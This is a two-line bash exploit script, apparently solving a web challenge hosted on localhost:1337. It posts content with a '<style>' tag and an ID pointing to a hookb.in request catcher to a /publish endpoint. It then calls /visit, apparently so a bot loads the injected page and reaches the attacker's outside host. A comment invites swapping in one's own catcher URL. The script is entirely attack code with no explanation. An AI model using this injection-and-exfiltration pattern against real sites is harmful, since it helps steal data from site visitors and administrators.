#! /bin/bash

# Replace Hookbin endpoints with your URL

curl -X POST -H 'Content-Type: application/json' --data-raw '{"_id": " https://hookb.in/NOw6ePJLG2hWZZpRVDKx", "content":"<style>"}' http://localhost:1337/publish
curl -X POST -H 'Content-Type: application/json' --data-raw '{"id": " https://hookb.in/NOw6ePJLG2hWZZpRVDKx"}' http://localhost:1337/visit